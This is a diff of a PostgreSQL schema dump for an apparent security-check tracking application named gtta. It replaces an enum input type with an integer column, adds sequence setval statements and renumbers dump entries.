@@ -4,7 +4,7 @@
 
 -- Dumped from database version 8.4.13
 -- Dumped by pg_dump version 9.1.3
--- Started on 2013-02-08 15:50:46 MSK
+-- Started on 2013-02-09 07:26:56 MSK
 
 SET statement_timeout = 0;
 SET client_encoding = 'UTF8';
@@ -47,22 +47,6 @@ CREATE TYPE check_status AS ENUM (
 
 
 ALTER TYPE public.check_status OWNER TO postgres;
-
---
--- TOC entry 694 (class 1247 OID 29313)
--- Dependencies: 6
--- Name: input_type; Type: TYPE; Schema: public; Owner: postgres
---
-
-CREATE TYPE input_type AS ENUM (
-    'text',
-    'textarea',
-    'checkbox',
-    'radio'
-);
-
-
-ALTER TYPE public.input_type OWNER TO postgres;
 
 --
 -- TOC entry 504 (class 1247 OID 21596)
@@ -143,12 +127,21 @@ CREATE SEQUENCE check_categories_id_seq
 ALTER TABLE public.check_categories_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2239 (class 0 OID 0)
+-- TOC entry 2278 (class 0 OID 0)
 -- Dependencies: 141
 -- Name: check_categories_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE check_categories_id_seq OWNED BY check_categories.id;
+
+
+--
+-- TOC entry 2279 (class 0 OID 0)
+-- Dependencies: 141
+-- Name: check_categories_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('check_categories_id_seq', 11, true);
 
 
 --
@@ -168,7 +161,7 @@ ALTER TABLE public.check_categories_l10n OWNER TO gtta;
 
 --
 -- TOC entry 143 (class 1259 OID 21619)
--- Dependencies: 2030 6
+-- Dependencies: 2027 6
 -- Name: check_controls; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -184,7 +177,7 @@ ALTER TABLE public.check_controls OWNER TO gtta;
 
 --
 -- TOC entry 144 (class 1259 OID 21625)
--- Dependencies: 143 6
+-- Dependencies: 6 143
 -- Name: check_controls_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -199,12 +192,21 @@ CREATE SEQUENCE check_controls_id_seq
 ALTER TABLE public.check_controls_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2240 (class 0 OID 0)
+-- TOC entry 2280 (class 0 OID 0)
 -- Dependencies: 144
 -- Name: check_controls_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE check_controls_id_seq OWNED BY check_controls.id;
+
+
+--
+-- TOC entry 2281 (class 0 OID 0)
+-- Dependencies: 144
+-- Name: check_controls_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('check_controls_id_seq', 17, true);
 
 
 --
@@ -224,7 +226,7 @@ ALTER TABLE public.check_controls_l10n OWNER TO gtta;
 
 --
 -- TOC entry 146 (class 1259 OID 21633)
--- Dependencies: 2031 2033 6 694
+-- Dependencies: 2028 2030 6
 -- Name: check_inputs; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -235,7 +237,7 @@ CREATE TABLE check_inputs (
     description character varying,
     sort_order integer DEFAULT 0 NOT NULL,
     value character varying,
-    type input_type DEFAULT 'text'::input_type NOT NULL
+    type integer DEFAULT 0 NOT NULL
 );
 
 
@@ -243,7 +245,7 @@ ALTER TABLE public.check_inputs OWNER TO gtta;
 
 --
 -- TOC entry 147 (class 1259 OID 21640)
--- Dependencies: 146 6
+-- Dependencies: 6 146
 -- Name: check_inputs_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -258,12 +260,21 @@ CREATE SEQUENCE check_inputs_id_seq
 ALTER TABLE public.check_inputs_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2241 (class 0 OID 0)
+-- TOC entry 2282 (class 0 OID 0)
 -- Dependencies: 147
 -- Name: check_inputs_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE check_inputs_id_seq OWNED BY check_inputs.id;
+
+
+--
+-- TOC entry 2283 (class 0 OID 0)
+-- Dependencies: 147
+-- Name: check_inputs_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('check_inputs_id_seq', 47, true);
 
 
 --
@@ -276,8 +287,7 @@ CREATE TABLE check_inputs_l10n (
     check_input_id bigint NOT NULL,
     language_id bigint NOT NULL,
     name character varying(1000),
-    description character varying,
-    value character varying
+    description character varying
 );
 
 
@@ -285,7 +295,7 @@ ALTER TABLE public.check_inputs_l10n OWNER TO gtta;
 
 --
 -- TOC entry 149 (class 1259 OID 21648)
--- Dependencies: 2034 6
+-- Dependencies: 2031 6
 -- Name: check_results; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -302,7 +312,7 @@ ALTER TABLE public.check_results OWNER TO gtta;
 
 --
 -- TOC entry 150 (class 1259 OID 21655)
--- Dependencies: 6 149
+-- Dependencies: 149 6
 -- Name: check_results_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -317,12 +327,21 @@ CREATE SEQUENCE check_results_id_seq
 ALTER TABLE public.check_results_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2242 (class 0 OID 0)
+-- TOC entry 2284 (class 0 OID 0)
 -- Dependencies: 150
 -- Name: check_results_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE check_results_id_seq OWNED BY check_results.id;
+
+
+--
+-- TOC entry 2285 (class 0 OID 0)
+-- Dependencies: 150
+-- Name: check_results_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('check_results_id_seq', 5, true);
 
 
 --
@@ -343,7 +362,7 @@ ALTER TABLE public.check_results_l10n OWNER TO gtta;
 
 --
 -- TOC entry 152 (class 1259 OID 21663)
--- Dependencies: 2036 6
+-- Dependencies: 2033 6
 -- Name: check_solutions; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -360,7 +379,7 @@ ALTER TABLE public.check_solutions OWNER TO gtta;
 
 --
 -- TOC entry 153 (class 1259 OID 21670)
--- Dependencies: 152 6
+-- Dependencies: 6 152
 -- Name: check_solutions_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -375,12 +394,21 @@ CREATE SEQUENCE check_solutions_id_seq
 ALTER TABLE public.check_solutions_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2243 (class 0 OID 0)
+-- TOC entry 2286 (class 0 OID 0)
 -- Dependencies: 153
 -- Name: check_solutions_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE check_solutions_id_seq OWNED BY check_solutions.id;
+
+
+--
+-- TOC entry 2287 (class 0 OID 0)
+-- Dependencies: 153
+-- Name: check_solutions_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('check_solutions_id_seq', 7, true);
 
 
 --
@@ -401,7 +429,7 @@ ALTER TABLE public.check_solutions_l10n OWNER TO gtta;
 
 --
 -- TOC entry 155 (class 1259 OID 21678)
--- Dependencies: 2038 2040 6
+-- Dependencies: 2035 2037 6
 -- Name: checks; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -445,12 +473,21 @@ CREATE SEQUENCE checks_id_seq
 ALTER TABLE public.checks_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2244 (class 0 OID 0)
+-- TOC entry 2288 (class 0 OID 0)
 -- Dependencies: 156
 -- Name: checks_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE checks_id_seq OWNED BY checks.id;
+
+
+--
+-- TOC entry 2289 (class 0 OID 0)
+-- Dependencies: 156
+-- Name: checks_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('checks_id_seq', 49, true);
 
 
 --
@@ -500,7 +537,7 @@ ALTER TABLE public.clients OWNER TO gtta;
 
 --
 -- TOC entry 159 (class 1259 OID 21699)
--- Dependencies: 158 6
+-- Dependencies: 6 158
 -- Name: clients_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -515,7 +552,7 @@ CREATE SEQUENCE clients_id_seq
 ALTER TABLE public.clients_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2245 (class 0 OID 0)
+-- TOC entry 2290 (class 0 OID 0)
 -- Dependencies: 159
 -- Name: clients_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
@@ -524,8 +561,17 @@ ALTER SEQUENCE clients_id_seq OWNED BY clients.id;
 
 
 --
+-- TOC entry 2291 (class 0 OID 0)
+-- Dependencies: 159
+-- Name: clients_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('clients_id_seq', 4, true);
+
+
+--
 -- TOC entry 160 (class 1259 OID 21701)
--- Dependencies: 2042 2043 6
+-- Dependencies: 2039 2040 6
 -- Name: emails; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -558,12 +604,21 @@ CREATE SEQUENCE emails_id_seq
 ALTER TABLE public.emails_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2246 (class 0 OID 0)
+-- TOC entry 2292 (class 0 OID 0)
 -- Dependencies: 161
 -- Name: emails_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE emails_id_seq OWNED BY emails.id;
+
+
+--
+-- TOC entry 2293 (class 0 OID 0)
+-- Dependencies: 161
+-- Name: emails_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('emails_id_seq', 10, true);
 
 
 --
@@ -584,7 +639,7 @@ ALTER TABLE public.languages OWNER TO gtta;
 
 --
 -- TOC entry 163 (class 1259 OID 21717)
--- Dependencies: 6 162
+-- Dependencies: 162 6
 -- Name: languages_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -599,7 +654,7 @@ CREATE SEQUENCE languages_id_seq
 ALTER TABLE public.languages_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2247 (class 0 OID 0)
+-- TOC entry 2294 (class 0 OID 0)
 -- Dependencies: 163
 -- Name: languages_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
@@ -608,8 +663,17 @@ ALTER SEQUENCE languages_id_seq OWNED BY languages.id;
 
 
 --
+-- TOC entry 2295 (class 0 OID 0)
+-- Dependencies: 163
+-- Name: languages_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('languages_id_seq', 3, true);
+
+
+--
 -- TOC entry 202 (class 1259 OID 28213)
--- Dependencies: 2076 6
+-- Dependencies: 2073 6
 -- Name: login_history; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -640,12 +704,21 @@ CREATE SEQUENCE login_history_id_seq
 ALTER TABLE public.login_history_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2248 (class 0 OID 0)
+-- TOC entry 2296 (class 0 OID 0)
 -- Dependencies: 201
 -- Name: login_history_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE login_history_id_seq OWNED BY login_history.id;
+
+
+--
+-- TOC entry 2297 (class 0 OID 0)
+-- Dependencies: 201
+-- Name: login_history_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('login_history_id_seq', 23, true);
 
 
 --
@@ -666,7 +739,7 @@ ALTER TABLE public.project_details OWNER TO gtta;
 
 --
 -- TOC entry 165 (class 1259 OID 21725)
--- Dependencies: 6 164
+-- Dependencies: 164 6
 -- Name: project_details_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -681,7 +754,7 @@ CREATE SEQUENCE project_details_id_seq
 ALTER TABLE public.project_details_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2249 (class 0 OID 0)
+-- TOC entry 2298 (class 0 OID 0)
 -- Dependencies: 165
 -- Name: project_details_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
@@ -690,8 +763,17 @@ ALTER SEQUENCE project_details_id_seq OWNED BY project_details.id;
 
 
 --
+-- TOC entry 2299 (class 0 OID 0)
+-- Dependencies: 165
+-- Name: project_details_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('project_details_id_seq', 4, true);
+
+
+--
 -- TOC entry 187 (class 1259 OID 26344)
--- Dependencies: 2066 6
+-- Dependencies: 2063 6
 -- Name: project_users; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -706,7 +788,7 @@ ALTER TABLE public.project_users OWNER TO gtta;
 
 --
 -- TOC entry 166 (class 1259 OID 21727)
--- Dependencies: 2047 6 504
+-- Dependencies: 2044 6 504
 -- Name: projects; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -740,12 +822,21 @@ CREATE SEQUENCE projects_id_seq
 ALTER TABLE public.projects_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2250 (class 0 OID 0)
+-- TOC entry 2300 (class 0 OID 0)
 -- Dependencies: 167
 -- Name: projects_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE projects_id_seq OWNED BY projects.id;
+
+
+--
+-- TOC entry 2301 (class 0 OID 0)
+-- Dependencies: 167
+-- Name: projects_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('projects_id_seq', 13, true);
 
 
 --
@@ -765,7 +856,7 @@ ALTER TABLE public."references" OWNER TO gtta;
 
 --
 -- TOC entry 169 (class 1259 OID 21742)
--- Dependencies: 6 168
+-- Dependencies: 168 6
 -- Name: references_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -780,7 +871,7 @@ CREATE SEQUENCE references_id_seq
 ALTER TABLE public.references_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2251 (class 0 OID 0)
+-- TOC entry 2302 (class 0 OID 0)
 -- Dependencies: 169
 -- Name: references_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
@@ -789,8 +880,17 @@ ALTER SEQUENCE references_id_seq OWNED BY "references".id;
 
 
 --
+-- TOC entry 2303 (class 0 OID 0)
+-- Dependencies: 169
+-- Name: references_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('references_id_seq', 2, true);
+
+
+--
 -- TOC entry 199 (class 1259 OID 28055)
--- Dependencies: 2074 6
+-- Dependencies: 2071 6
 -- Name: report_template_sections; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -823,12 +923,21 @@ CREATE SEQUENCE report_template_sections_id_seq
 ALTER TABLE public.report_template_sections_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2252 (class 0 OID 0)
+-- TOC entry 2304 (class 0 OID 0)
 -- Dependencies: 198
 -- Name: report_template_sections_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE report_template_sections_id_seq OWNED BY report_template_sections.id;
+
+
+--
+-- TOC entry 2305 (class 0 OID 0)
+-- Dependencies: 198
+-- Name: report_template_sections_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('report_template_sections_id_seq', 4, true);
 
 
 --
@@ -849,7 +958,7 @@ ALTER TABLE public.report_template_sections_l10n OWNER TO gtta;
 
 --
 -- TOC entry 196 (class 1259 OID 27336)
--- Dependencies: 2071 2072 6
+-- Dependencies: 2068 2069 6
 -- Name: report_template_summary; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -867,7 +976,7 @@ ALTER TABLE public.report_template_summary OWNER TO gtta;
 
 --
 -- TOC entry 195 (class 1259 OID 27334)
--- Dependencies: 196 6
+-- Dependencies: 6 196
 -- Name: report_template_summary_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -882,12 +991,21 @@ CREATE SEQUENCE report_template_summary_id_seq
 ALTER TABLE public.report_template_summary_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2253 (class 0 OID 0)
+-- TOC entry 2306 (class 0 OID 0)
 -- Dependencies: 195
 -- Name: report_template_summary_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE report_template_summary_id_seq OWNED BY report_template_summary.id;
+
+
+--
+-- TOC entry 2307 (class 0 OID 0)
+-- Dependencies: 195
+-- Name: report_template_summary_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('report_template_summary_id_seq', 4, true);
 
 
 --
@@ -936,7 +1054,7 @@ ALTER TABLE public.report_templates OWNER TO gtta;
 
 --
 -- TOC entry 192 (class 1259 OID 27304)
--- Dependencies: 193 6
+-- Dependencies: 6 193
 -- Name: report_templates_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -951,12 +1069,21 @@ CREATE SEQUENCE report_templates_id_seq
 ALTER TABLE public.report_templates_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2254 (class 0 OID 0)
+-- TOC entry 2308 (class 0 OID 0)
 -- Dependencies: 192
 -- Name: report_templates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE report_templates_id_seq OWNED BY report_templates.id;
+
+
+--
+-- TOC entry 2309 (class 0 OID 0)
+-- Dependencies: 192
+-- Name: report_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('report_templates_id_seq', 3, true);
 
 
 --
@@ -1018,12 +1145,21 @@ CREATE SEQUENCE risk_categories_id_seq
 ALTER TABLE public.risk_categories_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2255 (class 0 OID 0)
+-- TOC entry 2310 (class 0 OID 0)
 -- Dependencies: 182
 -- Name: risk_categories_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE risk_categories_id_seq OWNED BY risk_categories.id;
+
+
+--
+-- TOC entry 2311 (class 0 OID 0)
+-- Dependencies: 182
+-- Name: risk_categories_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('risk_categories_id_seq', 20, true);
 
 
 --
@@ -1043,7 +1179,7 @@ ALTER TABLE public.risk_categories_l10n OWNER TO gtta;
 
 --
 -- TOC entry 185 (class 1259 OID 24899)
--- Dependencies: 2064 2065 6
+-- Dependencies: 2061 2062 6
 -- Name: risk_category_checks; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -1088,12 +1224,21 @@ CREATE SEQUENCE risk_templates_id_seq
 ALTER TABLE public.risk_templates_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2256 (class 0 OID 0)
+-- TOC entry 2312 (class 0 OID 0)
 -- Dependencies: 188
 -- Name: risk_templates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
 
 ALTER SEQUENCE risk_templates_id_seq OWNED BY risk_templates.id;
+
+
+--
+-- TOC entry 2313 (class 0 OID 0)
+-- Dependencies: 188
+-- Name: risk_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('risk_templates_id_seq', 6, true);
 
 
 --
@@ -1142,7 +1287,7 @@ ALTER TABLE public.system OWNER TO gtta;
 
 --
 -- TOC entry 171 (class 1259 OID 21747)
--- Dependencies: 6 170
+-- Dependencies: 170 6
 -- Name: system_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -1157,7 +1302,7 @@ CREATE SEQUENCE system_id_seq
 ALTER TABLE public.system_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2257 (class 0 OID 0)
+-- TOC entry 2314 (class 0 OID 0)
 -- Dependencies: 171
 -- Name: system_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
@@ -1166,8 +1311,17 @@ ALTER SEQUENCE system_id_seq OWNED BY system.id;
 
 
 --
+-- TOC entry 2315 (class 0 OID 0)
+-- Dependencies: 171
+-- Name: system_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('system_id_seq', 2, true);
+
+
+--
 -- TOC entry 172 (class 1259 OID 21749)
--- Dependencies: 2051 6
+-- Dependencies: 2048 6
 -- Name: target_check_attachments; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -1185,7 +1339,7 @@ ALTER TABLE public.target_check_attachments OWNER TO gtta;
 
 --
 -- TOC entry 173 (class 1259 OID 21756)
--- Dependencies: 2052 2053 2054 2055 2056 2057 6
+-- Dependencies: 2049 2050 2051 2052 2053 2054 6
 -- Name: target_check_categories; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -1238,7 +1392,7 @@ ALTER TABLE public.target_check_solutions OWNER TO gtta;
 
 --
 -- TOC entry 191 (class 1259 OID 26906)
--- Dependencies: 2068 6 656
+-- Dependencies: 2065 6 656
 -- Name: target_check_vulns; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -1255,7 +1409,7 @@ ALTER TABLE public.target_check_vulns OWNER TO gtta;
 
 --
 -- TOC entry 176 (class 1259 OID 21773)
--- Dependencies: 2058 501 6 498
+-- Dependencies: 2055 6 501 498
 -- Name: target_checks; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -1312,7 +1466,7 @@ ALTER TABLE public.targets OWNER TO gtta;
 
 --
 -- TOC entry 179 (class 1259 OID 21789)
--- Dependencies: 6 178
+-- Dependencies: 178 6
 -- Name: targets_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -1327,7 +1481,7 @@ CREATE SEQUENCE targets_id_seq
 ALTER TABLE public.targets_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2258 (class 0 OID 0)
+-- TOC entry 2316 (class 0 OID 0)
 -- Dependencies: 179
 -- Name: targets_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
@@ -1336,8 +1490,17 @@ ALTER SEQUENCE targets_id_seq OWNED BY targets.id;
 
 
 --
+-- TOC entry 2317 (class 0 OID 0)
+-- Dependencies: 179
+-- Name: targets_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('targets_id_seq', 6, true);
+
+
+--
 -- TOC entry 180 (class 1259 OID 21791)
--- Dependencies: 2060 2062 6 507
+-- Dependencies: 2057 2059 6 507
 -- Name: users; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -1357,7 +1520,7 @@ ALTER TABLE public.users OWNER TO gtta;
 
 --
 -- TOC entry 181 (class 1259 OID 21798)
--- Dependencies: 6 180
+-- Dependencies: 180 6
 -- Name: users_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -1372,7 +1535,7 @@ CREATE SEQUENCE users_id_seq
 ALTER TABLE public.users_id_seq OWNER TO gtta;
 
 --
--- TOC entry 2259 (class 0 OID 0)
+-- TOC entry 2318 (class 0 OID 0)
 -- Dependencies: 181
 -- Name: users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
 --
@@ -1381,7 +1544,16 @@ ALTER SEQUENCE users_id_seq OWNED BY users.id;
 
 
 --
--- TOC entry 2028 (class 2604 OID 21800)
+-- TOC entry 2319 (class 0 OID 0)
+-- Dependencies: 181
+-- Name: users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
+--
+
+SELECT pg_catalog.setval('users_id_seq', 3, true);
+
+
+--
+-- TOC entry 2025 (class 2604 OID 21800)
 -- Dependencies: 141 140
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1390,7 +1562,7 @@ ALTER TABLE ONLY check_categories ALTER COLUMN id SET DEFAULT nextval('check_cat
 
 
 --
--- TOC entry 2029 (class 2604 OID 21801)
+-- TOC entry 2026 (class 2604 OID 21801)
 -- Dependencies: 144 143
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1399,7 +1571,7 @@ ALTER TABLE ONLY check_controls ALTER COLUMN id SET DEFAULT nextval('check_contr
 
 
 --
--- TOC entry 2032 (class 2604 OID 21802)
+-- TOC entry 2029 (class 2604 OID 21802)
 -- Dependencies: 147 146
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1408,7 +1580,7 @@ ALTER TABLE ONLY check_inputs ALTER COLUMN id SET DEFAULT nextval('check_inputs_
 
 
 --
--- TOC entry 2035 (class 2604 OID 21803)
+-- TOC entry 2032 (class 2604 OID 21803)
 -- Dependencies: 150 149
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1417,7 +1589,7 @@ ALTER TABLE ONLY check_results ALTER COLUMN id SET DEFAULT nextval('check_result
 
 
 --
--- TOC entry 2037 (class 2604 OID 21804)
+-- TOC entry 2034 (class 2604 OID 21804)
 -- Dependencies: 153 152
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1426,7 +1598,7 @@ ALTER TABLE ONLY check_solutions ALTER COLUMN id SET DEFAULT nextval('check_solu
 
 
 --
--- TOC entry 2039 (class 2604 OID 21805)
+-- TOC entry 2036 (class 2604 OID 21805)
 -- Dependencies: 156 155
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1435,7 +1607,7 @@ ALTER TABLE ONLY checks ALTER COLUMN id SET DEFAULT nextval('checks_id_seq'::reg
 
 
 --
--- TOC entry 2041 (class 2604 OID 21806)
+-- TOC entry 2038 (class 2604 OID 21806)
 -- Dependencies: 159 158
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1444,7 +1616,7 @@ ALTER TABLE ONLY clients ALTER COLUMN id SET DEFAULT nextval('clients_id_seq'::r
 
 
 --
--- TOC entry 2044 (class 2604 OID 21807)
+-- TOC entry 2041 (class 2604 OID 21807)
 -- Dependencies: 161 160
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1453,7 +1625,7 @@ ALTER TABLE ONLY emails ALTER COLUMN id SET DEFAULT nextval('emails_id_seq'::reg
 
 
 --
--- TOC entry 2045 (class 2604 OID 21808)
+-- TOC entry 2042 (class 2604 OID 21808)
 -- Dependencies: 163 162
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1462,7 +1634,7 @@ ALTER TABLE ONLY languages ALTER COLUMN id SET DEFAULT nextval('languages_id_seq
 
 
 --
--- TOC entry 2075 (class 2604 OID 28216)
+-- TOC entry 2072 (class 2604 OID 28216)
 -- Dependencies: 201 202 202
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1471,7 +1643,7 @@ ALTER TABLE ONLY login_history ALTER COLUMN id SET DEFAULT nextval('login_histor
 
 
 --
--- TOC entry 2046 (class 2604 OID 21809)
+-- TOC entry 2043 (class 2604 OID 21809)
 -- Dependencies: 165 164
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1480,7 +1652,7 @@ ALTER TABLE ONLY project_details ALTER COLUMN id SET DEFAULT nextval('project_de
 
 
 --
--- TOC entry 2048 (class 2604 OID 21810)
+-- TOC entry 2045 (class 2604 OID 21810)
 -- Dependencies: 167 166
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1489,7 +1661,7 @@ ALTER TABLE ONLY projects ALTER COLUMN id SET DEFAULT nextval('projects_id_seq':
 
 
 --
--- TOC entry 2049 (class 2604 OID 21811)
+-- TOC entry 2046 (class 2604 OID 21811)
 -- Dependencies: 169 168
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1498,8 +1670,8 @@ ALTER TABLE ONLY "references" ALTER COLUMN id SET DEFAULT nextval('references_id
 
 
 --
--- TOC entry 2073 (class 2604 OID 28058)
--- Dependencies: 199 198 199
+-- TOC entry 2070 (class 2604 OID 28058)
+-- Dependencies: 198 199 199
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
 
@@ -1507,8 +1679,8 @@ ALTER TABLE ONLY report_template_sections ALTER COLUMN id SET DEFAULT nextval('r
 
 
 --
--- TOC entry 2070 (class 2604 OID 27339)
--- Dependencies: 195 196 196
+-- TOC entry 2067 (class 2604 OID 27339)
+-- Dependencies: 196 195 196
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
 
@@ -1516,7 +1688,7 @@ ALTER TABLE ONLY report_template_summary ALTER COLUMN id SET DEFAULT nextval('re
 
 
 --
--- TOC entry 2069 (class 2604 OID 27309)
+-- TOC entry 2066 (class 2604 OID 27309)
 -- Dependencies: 193 192 193
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1525,8 +1697,8 @@ ALTER TABLE ONLY report_templates ALTER COLUMN id SET DEFAULT nextval('report_te
 
 
 --
--- TOC entry 2063 (class 2604 OID 22076)
--- Dependencies: 182 183 183
+-- TOC entry 2060 (class 2604 OID 22076)
+-- Dependencies: 183 182 183
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
 
@@ -1534,7 +1706,7 @@ ALTER TABLE ONLY risk_categories ALTER COLUMN id SET DEFAULT nextval('risk_categ
 
 
 --
--- TOC entry 2067 (class 2604 OID 26364)
+-- TOC entry 2064 (class 2604 OID 26364)
 -- Dependencies: 188 189 189
